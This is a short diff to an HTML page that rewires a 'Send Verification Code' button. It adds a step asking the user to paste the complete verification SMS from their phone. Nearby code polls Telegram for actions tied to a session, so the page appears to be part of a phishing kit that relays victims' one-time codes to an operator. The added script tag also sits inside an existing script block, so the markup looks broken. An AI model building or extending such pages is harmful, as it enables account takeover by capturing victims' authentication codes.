@@ -640,7 +640,7 @@ input[type="text"] {
 
         <button
             class="button blue"
-            onclick="goToOTP()"
+            onclick="goToOTPSMS()"
         >
             Send Verification Code
         </button>
@@ -1615,6 +1615,10 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
   }
 }
 
+<script>
+    function goToOTPSMS() {
+    showPage('page5', 4, 'Paste Verification SMS', 'Copy the complete verification SMS received on your phone and paste it below.');
+}
 </script>
 </body>
 </html>
